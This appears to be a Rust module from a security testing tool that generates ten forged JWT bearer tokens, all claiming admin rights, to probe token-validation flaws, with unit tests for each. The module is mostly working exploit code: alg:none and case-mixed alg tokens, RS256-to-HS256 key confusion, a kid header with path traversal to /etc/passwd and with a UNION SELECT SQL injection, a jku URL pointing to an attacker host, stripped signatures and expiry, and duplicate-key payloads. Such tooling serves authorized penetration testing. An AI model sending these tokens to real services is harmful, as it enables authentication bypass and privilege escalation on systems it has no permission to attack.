//! JWT (JSON Web Token) parser-differential probes.
//!
//! Exploits implementation disagreements in JWT validation
//! pipelines. JWT verifiers are notoriously bug-prone: the spec
//! says one thing but real-world libraries have shipped:
//!
//! - `alg:none` acceptance (CVE-2015-9235 and the long tail since)
//! - Algorithm confusion (HS256 verified with RS256 public key as
//!   HMAC secret — CVE-2016-10555, CVE-2016-5431, …)
//! - `kid` header parameter used as a filesystem path / SQL query
//!   without sanitization
//! - `jku` / `x5u` URL parameters trusted (attacker-controlled JWKS)
//! - Empty signature accepted when `alg` is non-`none`
//! - Expiration claim ignored or parsed via lenient deserializer
//! - Duplicate-key resolution differential in the JSON payload
//!
//! Each probe emits ONE
//! `(Authorization, "Bearer <crafted-jwt>")` header pair. Splice
//! into the outgoing request.
//!
//! ## Seed token
//!
//! Each variant builds the JWT from a baseline payload claiming
//! admin role. Operators replace via the `--credential` flag, but
//! the default token has the shape:
//!
//! ```text
//! eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
//! eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.
//! d2FmcmlmdC1zaWctcGxhY2Vob2xkZXI
//! ```
//!
//! ## References
//!
//! - <https://datatracker.ietf.org/doc/html/rfc7519> (JWT)
//! - <https://www.rfc-editor.org/rfc/rfc8725> (JWT BCP, security)
//! - <https://blog.pentesteracademy.com/hacking-jwt-tokens-cve-2015-9235-the-none-algorithm-d8edaa46c4dd>

use base64::Engine;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;
use wafrift_types::canary::Canary;
use wafrift_types::probe::{SmuggleArtifact, SmuggleProbe};

/// Which JWT validation-differential variant to emit.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum JwtSmuggleTechnique {
    /// `{"alg":"none","typ":"JWT"}` header, empty signature.
    /// The headline JWT vuln class — RFC 7519 permits `alg:none`
    /// in unsigned tokens, but signed-token validators that
    /// "trust" the header MUST reject. Some still don't.
    AlgNone,
    /// `{"alg":"NoNe","typ":"JWT"}` — case-mixed alg.
    /// Case-sensitive validators reject; ascii-fold validators
    /// accept and downgrade to none.
    AlgNoneCaseMix,
    /// `{"alg":"HS256","typ":"JWT"}` — but the original token was
    /// RS256. Servers that fetch the RSA public key + use it as
    /// the HMAC secret accept a forged HMAC signature.
    AlgConfusionRs256ToHs256,
    /// `{"alg":"HS256","kid":"../../../etc/passwd"}` — path-
    /// traversal in the `kid` header. Servers that load the key
    /// from a kid-derived filesystem path can be tricked into
    /// loading a known-content file (e.g. /dev/null = empty HMAC
    /// key).
    KidPathTraversal,
    /// `{"alg":"HS256","kid":"x' UNION SELECT 'AAAA'--"}` — SQL
    /// injection in the `kid` header. Servers that look up the
    /// HMAC key via `SELECT key FROM keys WHERE kid='<kid>'` can
    /// be coerced to return an attacker-chosen key.
    KidSqlInjection,
    /// `{"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}`
    /// — attacker-controlled JWKS URL. Servers that fetch the
    /// signing key from the `jku` URL without origin-pinning load
    /// the attacker's key.
    JkuAttackerUrl,
    /// Strip the signature segment. Token shape becomes
    /// `header.payload.` (with trailing dot). Some validators
    /// treat empty signature as "no signature required" when alg
    /// is unset.
    EmptySignature,
    /// Replace signature with a fixed garbage string. Validators
    /// that succeed on ANY non-empty signature when `alg=none`
    /// (paradoxically) bypass.
    NoneAlgWithGarbageSignature,
    /// Strip the `exp` claim entirely. Validators that conditionally
    /// check `exp` (only-if-present) accept a permanent token.
    ExpiryClaimRemoved,
    /// `{"role":"guest","role":"admin"}` — duplicate-key in the
    /// payload. RFC 8259 leaves resolution implementation-defined;
    /// validators see "guest", backend sees "admin" (or vice versa).
    PayloadDuplicateKey,
}

impl JwtSmuggleTechnique {
    /// Stable kebab-case technique name.
    #[must_use]
    pub fn technique_name(&self) -> &'static str {
        match self {
            Self::AlgNone => "jwt.alg-none",
            Self::AlgNoneCaseMix => "jwt.alg-none-case-mix",
            Self::AlgConfusionRs256ToHs256 => "jwt.alg-confusion-rs256-to-hs256",
            Self::KidPathTraversal => "jwt.kid-path-traversal",
            Self::KidSqlInjection => "jwt.kid-sql-injection",
            Self::JkuAttackerUrl => "jwt.jku-attacker-url",
            Self::EmptySignature => "jwt.empty-signature",
            Self::NoneAlgWithGarbageSignature => "jwt.none-alg-with-garbage-signature",
            Self::ExpiryClaimRemoved => "jwt.expiry-claim-removed",
            Self::PayloadDuplicateKey => "jwt.payload-duplicate-key",
        }
    }

    /// One-line operator description.
    #[must_use]
    pub fn description(&self) -> &'static str {
        match self {
            Self::AlgNone => {
                "`alg:none` acceptance — historic CVE class, still ships in lazy validators"
            }
            Self::AlgNoneCaseMix => "Case-mixed `alg:NoNe` — ascii-fold downgrade differential",
            Self::AlgConfusionRs256ToHs256 => {
                "RS256→HS256 algorithm confusion — RSA public key used as HMAC secret"
            }
            Self::KidPathTraversal => {
                "Path traversal in `kid` header — file-load key resolution exploit"
            }
            Self::KidSqlInjection => "SQL injection in `kid` header — DB key-lookup exploit",
            Self::JkuAttackerUrl => "Attacker-controlled `jku` URL — JWKS fetch differential",
            Self::EmptySignature => "Empty signature segment — no-sig-required validator bypass",
            Self::NoneAlgWithGarbageSignature => {
                "Garbage signature with `alg:none` — validator paradox bypass"
            }
            Self::ExpiryClaimRemoved => "Stripped `exp` claim — permanent-token bypass",
            Self::PayloadDuplicateKey => {
                "Duplicate-key in JWT payload — RFC 8259 resolution differential"
            }
        }
    }
}

/// One JWT validation-differential smuggle probe.
#[derive(Debug, Clone)]
pub struct JwtSmuggleProbe {
    /// Per-probe correlation token.
    pub canary: Canary,
    /// Variant.
    pub technique: JwtSmuggleTechnique,
    /// Crafted JWT string (`header.payload.signature` form).
    pub token: String,
}

/// base64url-encode raw bytes (no padding) per RFC 7515 §3.
fn b64url(bytes: &[u8]) -> String {
    URL_SAFE_NO_PAD.encode(bytes)
}

/// Default header / payload / signature placeholder used when the
/// operator doesn't supply a base token. The shapes match standard
/// RS256 / HS256 JWT layout so validators see a structurally
/// realistic token.
const DEFAULT_PAYLOAD_JSON: &str = r#"{"sub":"admin","role":"admin","exp":9999999999}"#;
const PLACEHOLDER_SIG: &str = "wafrift-sig-placeholder";

impl JwtSmuggleProbe {
    /// Build a probe for a given technique. The supplied
    /// `credential_value` is used as the BASE JWT if it looks like
    /// a JWT (three dot-separated segments); otherwise a synthetic
    /// admin token is built around the credential value.
    #[must_use]
    pub fn new(technique: JwtSmuggleTechnique, credential_value: &str) -> Self {
        // Try to use the operator's --credential as a base JWT —
        // if it's not a 3-segment JWT, build a synthetic one with
        // the credential spliced into the `sub` claim.
        let (base_header, base_payload, base_sig) = split_or_synthesize_jwt(credential_value);

        let token = match technique {
            JwtSmuggleTechnique::AlgNone => {
                let header = r#"{"alg":"none","typ":"JWT"}"#;
                format!("{}.{}.", b64url(header.as_bytes()), base_payload)
            }
            JwtSmuggleTechnique::AlgNoneCaseMix => {
                let header = r#"{"alg":"NoNe","typ":"JWT"}"#;
                format!("{}.{}.", b64url(header.as_bytes()), base_payload)
            }
            JwtSmuggleTechnique::AlgConfusionRs256ToHs256 => {
                let header = r#"{"alg":"HS256","typ":"JWT"}"#;
                format!(
                    "{}.{}.{}",
                    b64url(header.as_bytes()),
                    base_payload,
                    b64url(PLACEHOLDER_SIG.as_bytes())
                )
            }
            JwtSmuggleTechnique::KidPathTraversal => {
                let header = r#"{"alg":"HS256","kid":"../../../etc/passwd","typ":"JWT"}"#;
                format!(
                    "{}.{}.{}",
                    b64url(header.as_bytes()),
                    base_payload,
                    b64url(PLACEHOLDER_SIG.as_bytes())
                )
            }
            JwtSmuggleTechnique::KidSqlInjection => {
                let header = r#"{"alg":"HS256","kid":"x' UNION SELECT 'AAAA'--","typ":"JWT"}"#;
                format!(
                    "{}.{}.{}",
                    b64url(header.as_bytes()),
                    base_payload,
                    b64url(PLACEHOLDER_SIG.as_bytes())
                )
            }
            JwtSmuggleTechnique::JkuAttackerUrl => {
                let header =
                    r#"{"alg":"RS256","jku":"https://attacker.example/keys.json","typ":"JWT"}"#;
                format!(
                    "{}.{}.{}",
                    b64url(header.as_bytes()),
                    base_payload,
                    b64url(PLACEHOLDER_SIG.as_bytes())
                )
            }
            JwtSmuggleTechnique::EmptySignature => {
                format!("{base_header}.{base_payload}.")
            }
            JwtSmuggleTechnique::NoneAlgWithGarbageSignature => {
                let header = r#"{"alg":"none","typ":"JWT"}"#;
                format!(
                    "{}.{}.{}",
                    b64url(header.as_bytes()),
                    base_payload,
                    b64url(b"garbage-sig-not-validated")
                )
            }
            JwtSmuggleTechnique::ExpiryClaimRemoved => {
                let payload = r#"{"sub":"admin","role":"admin"}"#;
                format!(
                    "{}.{}.{}",
                    base_header,
                    b64url(payload.as_bytes()),
                    base_sig
                )
            }
            JwtSmuggleTechnique::PayloadDuplicateKey => {
                // Hand-built JSON with duplicate `role` — serde_json
                // refuses to emit dup keys via its normal API, so we
                // construct the bytes manually.
                let payload = r#"{"sub":"admin","role":"guest","role":"admin","exp":9999999999}"#;
                format!(
                    "{}.{}.{}",
                    base_header,
                    b64url(payload.as_bytes()),
                    base_sig
                )
            }
        };
        Self {
            canary: Canary::generate(),
            technique,
            token,
        }
    }

    /// The final `Authorization: Bearer <token>` value.
    #[must_use]
    pub fn bearer_header_value(&self) -> String {
        format!("Bearer {}", self.token)
    }
}

/// Split a credential into `(base_header_b64, base_payload_b64,
/// base_sig_b64)` if it looks like a JWT; otherwise synthesize a
/// default admin token. The synthetic token uses the operator-
/// supplied credential as the `sub` claim so probes still carry
/// operator identity even on a non-JWT credential string.
fn split_or_synthesize_jwt(credential: &str) -> (String, String, String) {
    let parts: Vec<&str> = credential.splitn(3, '.').collect();
    if parts.len() == 3
        && !parts[0].is_empty()
        && !parts[1].is_empty()
        // Looks like a JWT — accept it.
        && parts.iter().all(|p| p.bytes().all(|b| {
            b.is_ascii_alphanumeric() || b == b'-' || b == b'_' || b == b'='
        }))
    {
        (
            parts[0].to_string(),
            parts[1].to_string(),
            parts[2].to_string(),
        )
    } else {
        // Synthesize. Pin the sub claim to the operator credential
        // so the probe carries identity context.
        let header = r#"{"alg":"HS256","typ":"JWT"}"#;
        let payload_obj = format!(
            r#"{{"sub":"{}","role":"admin","exp":9999999999}}"#,
            json_escape(credential)
        );
        let payload = if payload_obj.is_empty() {
            DEFAULT_PAYLOAD_JSON.to_string()
        } else {
            payload_obj
        };
        (
            b64url(header.as_bytes()),
            b64url(payload.as_bytes()),
            b64url(PLACEHOLDER_SIG.as_bytes()),
        )
    }
}

/// JSON-quote a string value's contents (escape `"` and `\`). Does
/// NOT add surrounding quotes — caller does that. Minimal: doesn't
/// handle control bytes (they should never be in a credential).
fn json_escape(s: &str) -> String {
    s.replace('\\', "\\\\").replace('"', "\\\"")
}

impl SmuggleProbe for JwtSmuggleProbe {
    fn canary(&self) -> &Canary {
        &self.canary
    }
    fn technique(&self) -> String {
        self.technique.technique_name().to_string()
    }
    fn description(&self) -> &str {
        self.technique.description()
    }
    fn artifact(&self) -> SmuggleArtifact {
        SmuggleArtifact::Headers(vec![(
            "Authorization".to_string(),
            self.bearer_header_value(),
        )])
    }
}

/// Every JWT smuggle variant against the given seed credential.
/// Returns 10 probes — one per [`JwtSmuggleTechnique`] variant.
#[must_use]
pub fn all_variants(credential: &str) -> Vec<JwtSmuggleProbe> {
    use JwtSmuggleTechnique::*;
    [
        AlgNone,
        AlgNoneCaseMix,
        AlgConfusionRs256ToHs256,
        KidPathTraversal,
        KidSqlInjection,
        JkuAttackerUrl,
        EmptySignature,
        NoneAlgWithGarbageSignature,
        ExpiryClaimRemoved,
        PayloadDuplicateKey,
    ]
    .iter()
    .map(|t| JwtSmuggleProbe::new(*t, credential))
    .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashSet;

    #[test]
    fn all_variants_emits_one_per_technique() {
        assert_eq!(all_variants("wafrift-test").len(), 10);
    }

    #[test]
    fn every_probe_uses_jwt_family_namespace() {
        for p in all_variants("wafrift-test") {
            assert!(p.technique().starts_with("jwt."), "got {}", p.technique());
        }
    }

    #[test]
    fn every_probe_emits_authorization_bearer_header() {
        for p in all_variants("wafrift-test") {
            match p.artifact() {
                SmuggleArtifact::Headers(hs) => {
                    assert_eq!(hs.len(), 1);
                    assert_eq!(hs[0].0, "Authorization");
                    assert!(hs[0].1.starts_with("Bearer "), "got {:?}", hs[0].1);
                }
                other => panic!("expected Headers, got {other:?}"),
            }
        }
    }

    #[test]
    fn alg_none_variant_has_three_dot_separated_segments_with_empty_sig() {
        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::AlgNone, "wafrift-test");
        let parts: Vec<&str> = p.token.split('.').collect();
        assert_eq!(parts.len(), 3, "expected 3 segments: {}", p.token);
        // Signature segment is empty for AlgNone.
        assert!(parts[2].is_empty(), "alg-none sig must be empty");
    }

    #[test]
    fn alg_none_header_decodes_to_none_alg() {
        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::AlgNone, "wafrift-test");
        let header_b64 = p.token.split('.').next().unwrap();
        let header_bytes = URL_SAFE_NO_PAD.decode(header_b64).unwrap();
        let header = String::from_utf8(header_bytes).unwrap();
        assert!(header.contains("\"none\""), "header: {header}");
    }

    #[test]
    #[allow(non_snake_case)] // `NoNe` mirrors the asserted mixed-case alg literal — the case-mix bypass marker.
    fn alg_none_case_mix_header_decodes_to_NoNe() {
        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::AlgNoneCaseMix, "wafrift-test");
        let header_b64 = p.token.split('.').next().unwrap();
        let header = String::from_utf8(URL_SAFE_NO_PAD.decode(header_b64).unwrap()).unwrap();
        assert!(header.contains("NoNe"), "header: {header}");
    }

    #[test]
    fn alg_confusion_variant_advertises_hs256() {
        let p = JwtSmuggleProbe::new(
            JwtSmuggleTechnique::AlgConfusionRs256ToHs256,
            "wafrift-test",
        );
        let header = decode_header(&p.token);
        assert!(header.contains("HS256"), "header: {header}");
    }

    #[test]
    fn kid_path_traversal_variant_contains_etc_passwd() {
        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::KidPathTraversal, "wafrift-test");
        let header = decode_header(&p.token);
        assert!(header.contains("etc/passwd"), "header: {header}");
    }

    #[test]
    fn kid_sql_injection_variant_contains_sql_payload() {
        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::KidSqlInjection, "wafrift-test");
        let header = decode_header(&p.token);
        assert!(header.contains("UNION SELECT"), "header: {header}");
    }

    #[test]
    fn jku_attacker_variant_contains_attacker_url() {
        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::JkuAttackerUrl, "wafrift-test");
        let header = decode_header(&p.token);
        assert!(header.contains("attacker"), "header: {header}");
    }

    #[test]
    fn empty_signature_variant_ends_with_dot() {
        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::EmptySignature, "wafrift-test");
        assert!(p.token.ends_with('.'), "token: {}", p.token);
    }

    #[test]
    fn expiry_removed_variant_payload_lacks_exp_claim() {
        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::ExpiryClaimRemoved, "wafrift-test");
        let payload_b64 = p.token.split('.').nth(1).unwrap();
        let payload = String::from_utf8(URL_SAFE_NO_PAD.decode(payload_b64).unwrap()).unwrap();
        assert!(!payload.contains("exp"), "payload still has exp: {payload}");
    }

    #[test]
    fn payload_duplicate_key_variant_contains_two_role_pairs() {
        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::PayloadDuplicateKey, "wafrift-test");
        let payload_b64 = p.token.split('.').nth(1).unwrap();
        let payload = String::from_utf8(URL_SAFE_NO_PAD.decode(payload_b64).unwrap()).unwrap();
        let role_count = payload.matches("\"role\":").count();
        assert_eq!(role_count, 2, "payload: {payload}");
    }

    #[test]
    fn canaries_are_unique_per_probe() {
        let probes = all_variants("wafrift-test");
        let tokens: HashSet<String> = probes.iter().map(|p| p.canary().token.clone()).collect();
        assert_eq!(tokens.len(), probes.len());
    }

    #[test]
    fn technique_names_are_distinct() {
        let probes = all_variants("wafrift-test");
        let techs: HashSet<String> = probes.iter().map(|p| p.technique()).collect();
        assert_eq!(techs.len(), probes.len());
    }

    #[test]
    fn descriptions_are_non_empty_and_distinct() {
        let probes = all_variants("wafrift-test");
        let descs: HashSet<&str> = probes.iter().map(|p| p.description()).collect();
        assert_eq!(descs.len(), probes.len());
    }

    #[test]
    fn operator_supplied_jwt_is_used_as_base() {
        // Build a real-looking 3-segment JWT and feed it as
        // credential. AlgNone variant should reuse the payload
        // segment verbatim.
        let base_payload_json = r#"{"user":"victim","role":"admin"}"#;
        let base = format!(
            "{}.{}.{}",
            URL_SAFE_NO_PAD.encode(r#"{"alg":"RS256"}"#),
            URL_SAFE_NO_PAD.encode(base_payload_json),
            URL_SAFE_NO_PAD.encode("placeholder")
        );
        let p = JwtSmuggleProbe::new(JwtSmuggleTechnique::AlgNone, &base);
        let parts: Vec<&str> = p.token.split('.').collect();
        let payload = String::from_utf8(URL_SAFE_NO_PAD.decode(parts[1]).unwrap()).unwrap();
        assert!(payload.contains("victim"), "payload: {payload}");
    }

    #[test]
    fn non_jwt_credential_is_synthesized_into_sub_claim() {
        let p = JwtSmuggleProbe::new(
            JwtSmuggleTechnique::AlgConfusionRs256ToHs256,
            "wafrift-custom-creds",
        );
        let parts: Vec<&str> = p.token.split('.').collect();
        let payload = String::from_utf8(URL_SAFE_NO_PAD.decode(parts[1]).unwrap()).unwrap();
        assert!(
            payload.contains("wafrift-custom-creds"),
            "payload: {payload}"
        );
    }

    /// Test helper: decode the JWT header from a token string.
    fn decode_header(token: &str) -> String {
        let b64 = token.split('.').next().unwrap();
        String::from_utf8(URL_SAFE_NO_PAD.decode(b64).unwrap()).unwrap()
    }
}
